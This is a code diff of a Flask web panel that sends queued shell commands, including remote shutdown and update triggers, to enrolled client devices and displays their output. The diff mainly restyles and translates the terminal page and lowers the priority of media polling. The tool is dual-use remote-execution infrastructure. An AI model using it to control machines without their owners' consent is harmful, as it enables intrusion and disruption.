@@ -2,104 +2,30 @@ from flask import Blueprint, request, render_template_string, session, redirect,
 from datetime import datetime
 import os, time, json, threading
 from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, decrypt_data, add_cmd_to_queue, get_next_cmd, init_client_queue
+try:
+    from ui import ADMIN_CSS
+except Exception:
+    ADMIN_CSS = ""
 
 bp = Blueprint('terminal', __name__)
+
 
 @bp.route('/terminal/<mac>')
 def terminal_page(mac):
     if not session.get('logged_in'): return redirect(url_for('auth.login'))
-    if mac not in clients_db: return "设备不存在"
-    
+    if mac not in clients_db: return "Device not found"
     TERMINAL_HTML = """
-    <!DOCTYPE html>
-    <html lang="zh-CN">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>终端 - {{ info.name }} ({{ mac }})</title>
-        <style>
-            body { background: #000; color: #00ff00; font-family: Consolas, monospace; padding: 10px; margin: 0; }
-            #output { font-family: Consolas; white-space: pre-wrap; word-wrap: break-word; padding-bottom: 40px; }
-            .header { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px; display: flex; flex-direction: column; }
-            .header a { color: #aaa; text-decoration: none; margin-top: 5px; }
-            .header a:hover { color: #fff; }
-            .input-area { display: flex; flex-wrap: wrap; position: fixed; bottom: 0; left: 0; right: 0; background: #111; padding: 10px; border-top: 1px solid #333; }
-            .input-area span { width: 100%; padding-bottom: 5px; box-sizing: border-box; font-size: 12px; }
-            .input-area input { flex-grow: 1; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: Consolas; outline: none; min-width: 180px; }
-            .input-area button { background: #00ff00; color: #000; font-weight: bold; border: none; padding: 8px 15px; cursor: pointer; margin-left: 5px; margin-top: 5px;}
-            .input-area button:hover { background: #00cc00; }
-            .sys-msg { color: #888; }
-        </style>
-    </head>
-    <body>
-        <div class="header">
-            <span>>_ {{ info.name }}  [{{ mac }}] 的安全终端交互界面 (SYSTEM权限) <span id="conn_status"></span></span>
-            <a href="/">[ 返回设备列表 ]</a>
-        </div>
-        <div id="output"><span class="sys-msg">正在链接受控端，获取最后输出缓冲...</span></div>
-        <br><br><br>
-        <div class="input-area">
-            <span style="color:#aaa;">root@{{ info.name }}:~#</span>
-            <div style="display:flex; width: 100%;">
-                <input type="text" id="cmd" placeholder="输入命令..." onkeydown="if(event.keyCode==13) sendCmd()">
-                <button onclick="sendCmd()">发送</button>
-                <button onclick="window.location.href='/'" style="background:#6c757d; color:#fff;">返回</button>
-            </div>
-        </div>
-
-        <script>
-            function checkPing() {
-                fetch('/api/ping/{{ mac }}')
-                .then(r => r.json())
-                .then(data => {
-                    let st = document.getElementById('conn_status');
-                    if(data.status === 'online') {
-                        st.innerHTML = '🟢 实时设备在线';
-                        st.style.color = '#28a745';
-                    } else {
-                        st.innerHTML = '🔴 设备疑似掉线';
-                        st.style.color = 'red';
-                    }
-                });
-            }
-            setInterval(checkPing, 3000);
-            checkPing();
-
-            function fetchOutput() {
-                fetch('/api/get_cmd_result/{{ mac }}')
-                .then(r => r.json())
-                .then(data => {
-                    if(data.status === 'ok') {
-                        var el = document.getElementById('output');
-                        if (el.textContent !== data.output) {
-                            var isScrolledToBottom = (window.innerHeight + window.scrollY) >= (document.body.offsetHeight - 50);
-                            el.textContent = data.output;
-                            if (isScrolledToBottom) {
-                                window.scrollTo(0, document.body.scrollHeight);
-                            }
-                        }
-                    }
-                });
-            }
-            setInterval(fetchOutput, 500);
-            fetchOutput();
-
-            function sendCmd() {
-                var cmd = document.getElementById('cmd').value;
-                if(!cmd) return;
-                document.getElementById('cmd').value = '';
-
-                fetch('/api/send_cmd', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({mac: '{{ mac }}', cmd: cmd})
-                }).then(() => fetchOutput()); // 发送后直接立即拉取渲染一下执行状态
-            }
-        </script>
-    </body>
-    </html>
+    <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"><title>Terminal - {{ info.name }} ({{ mac }})</title>
+    <style>{{ admin_css|safe }}body{background:#0b1020;color:#8cff9a;font-family:Consolas,monospace}.terminal-shell{max-width:1180px;margin:0 auto;padding:16px 12px 90px}.terminal-panel{background:#05070d;border:1px solid #1f2937;border-radius:8px;padding:14px;min-height:65vh;white-space:pre-wrap;word-break:break-word}.header{border-color:#1f2937}.input-area{position:fixed;left:0;right:0;bottom:0;background:#111827;border-top:1px solid #374151;padding:10px;z-index:10}.input-row{max-width:1180px;margin:0 auto;display:flex;gap:8px}.input-row input{flex:1;background:#05070d;color:#8cff9a;border-color:#16a34a;font-family:Consolas,monospace}@media(max-width:640px){.input-row{flex-wrap:wrap}.input-row button{flex:1 1 calc(50% - 8px)}}.sys-msg{color:#9ca3af}</style></head>
+    <body><main class="terminal-shell"><div class="header"><div><b>>_ {{ info.name }}</b><br><span class="subtle">{{ mac }} <span id="conn_status"></span></span></div><a class="btn muted" href="/">Back</a></div><div id="output" class="terminal-panel"><span class="sys-msg">Connecting and loading cached output...</span></div></main>
+    <div class="input-area"><div class="input-row"><input type="text" id="cmd" placeholder="Command..." onkeydown="if(event.keyCode==13) sendCmd()"><button onclick="sendCmd()">Send</button><button class="muted" onclick="window.location.href='/'">Back</button></div></div>
+    <script>
+    function checkPing(){fetch('/api/ping/{{ mac }}').then(r=>r.json()).then(data=>{let st=document.getElementById('conn_status');if(data.status==='online'){st.innerHTML='Online';st.style.color='#16a34a'}else{st.innerHTML='Offline';st.style.color='#dc2626'}})}setInterval(checkPing,3000);checkPing();
+    function fetchOutput(){fetch('/api/get_cmd_result/{{ mac }}').then(r=>r.json()).then(data=>{if(data.status==='ok'){var el=document.getElementById('output');if(el.textContent!==data.output){var bottom=(window.innerHeight+window.scrollY)>=(document.body.offsetHeight-50);el.textContent=data.output;if(bottom)window.scrollTo(0,document.body.scrollHeight)}}})}setInterval(fetchOutput,500);fetchOutput();
+    function sendCmd(){var cmd=document.getElementById('cmd').value;if(!cmd)return;document.getElementById('cmd').value='';fetch('/api/send_cmd',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mac:'{{ mac }}',cmd:cmd})}).then(()=>fetchOutput())}
+    </script></body></html>
     """
-    return render_template_string(TERMINAL_HTML, mac=mac, info=clients_db[mac])
+    return render_template_string(TERMINAL_HTML, admin_css=ADMIN_CSS, mac=mac, info=clients_db[mac])
 
 @bp.route('/cmd_result', methods=['POST'])
 def cmd_result():
@@ -127,6 +53,9 @@ def api_send_cmd():
 
     # 确定命令优先级（娱乐命令用 'normal'，重要命令用 'high'）
     priority = 'high' if cmd in ['UPDATE_NOW', 'shutdown /s /t 0', 'shutdown /r /t 0'] else 'normal'
+    is_media_info_poll = (cmd == 'F_CMD:MEDIA_INFO:')
+    if is_media_info_poll:
+        priority = 'low'
 
     # 处理 UPDATE_NOW 特殊逻辑
     if cmd == 'UPDATE_NOW':
@@ -153,11 +82,12 @@ def api_send_cmd():
     if not success:
         return jsonify({"status": "error", "msg": "命令队列已满，请稍后重试"}), 429
 
-    # 记录到终端历史（用于展示）
-    name = clients_db[mac].get('name', '未命名设备')
-    clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {cmd}\n")[-50000:]
-    clients_db[mac]['is_executing'] = True
-    save_db()
+    # 记录到终端历史（用于展示）；媒体信息自动轮询不刷屏。
+    if not is_media_info_poll:
+        name = clients_db[mac].get('name', '未命名设备')
+        clients_db[mac]['terminal_history'] = (clients_db[mac].get('terminal_history', '') + f"\nroot@{name}:~# {cmd}\n")[-50000:]
+        clients_db[mac]['is_executing'] = True
+        save_db()
 
     return jsonify({"status": "ok", "msg": "命令已入队，等待设备执行"})
 
